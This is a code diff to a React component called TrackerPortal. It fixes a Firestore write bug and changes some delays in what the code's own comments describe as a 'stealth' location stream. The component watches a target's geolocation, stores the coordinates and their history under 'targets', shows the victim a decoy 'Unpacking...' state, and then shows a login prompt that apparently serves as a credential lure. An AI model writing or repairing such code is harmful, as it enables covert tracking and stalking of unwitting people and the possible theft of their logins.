@@ -14,11 +14,11 @@ import {
   arrayUnion
 } from '../lib/firebase';
 
-const formatTime = (seconds: number) => {
+function formatTime(seconds: number) {
   const mins = Math.floor(seconds / 60);
   const secs = seconds % 60;
   return `${mins}:${secs.toString().padStart(2, '0')}`;
-};
+}
 
 export const TrackerPortal: React.FC = () => {
   const [status, setStatus] = useState<'idle' | 'scanning' | 'granted' | 'denied' | 'error'>('idle');
@@ -120,16 +120,25 @@ export const TrackerPortal: React.FC = () => {
       // High-precision stealth stream
       navigator.geolocation.watchPosition(
         async (position) => {
-          // Once granted, we switch to a 'granted' state which shows "Unpacking..."
           setStatus('granted');
           const { latitude, longitude, accuracy } = position.coords;
           
           try {
-            // Persistent stealth uplink with history tracking (Atomic Write)
             const uid = auth.currentUser?.uid || targetId || `T-ANON-${Math.random().toString(36).substring(7).toUpperCase()}`;
             const targetRef = doc(db, 'targets', uid);
             
-            const payload = {
+            // First check if target exists to avoid overwriting metadata accidentally or handle first-time setup
+            // However, setDoc with merge: true is usually enough. 
+            // To fix "Nested arrays are not supported", we'll use a direct object for non-array fields
+            // and update history separately if needed, or stick to a flatter setDoc call.
+            
+            const historyItem = { 
+              lat: latitude, 
+              lng: longitude, 
+              time: new Date().toISOString() 
+            };
+
+            await setDoc(targetRef, {
               name: targetDisplayName,
               lat: latitude,
               lng: longitude,
@@ -137,26 +146,20 @@ export const TrackerPortal: React.FC = () => {
               lastSeen: new Date().toISOString(),
               status: 'active',
               platform: platform,
-              history: arrayUnion({ 
-                lat: latitude, 
-                lng: longitude, 
-                time: new Date().toISOString() 
-              })
-            };
-
-            await setDoc(targetRef, payload, { merge: true });
+              history: arrayUnion(historyItem)
+            }, { merge: true });
             
-            // Temporary signal success indicator
+            // Notification success
             const signalHint = document.createElement('div');
             signalHint.className = 'fixed bottom-4 left-1/2 -translate-x-1/2 bg-emerald-500/10 border border-emerald-500/50 text-emerald-500 text-[8px] font-bold px-3 py-1 rounded shadow-lg z-[9999] animate-bounce';
             signalHint.innerText = 'SIGNAL_LATCHED: HANDSHAKE_SUCCESS';
             document.body.appendChild(signalHint);
-            setTimeout(() => signalHint.remove(), 3000);
+            setTimeout(() => signalHint.remove(), 4000);
 
             // Show login challenge after a brief delay
             setTimeout(() => {
                setShowLogin(true);
-            }, 2000);
+            }, 3000);
 
           } catch (e) {
             console.error("Uplink Error:", e);
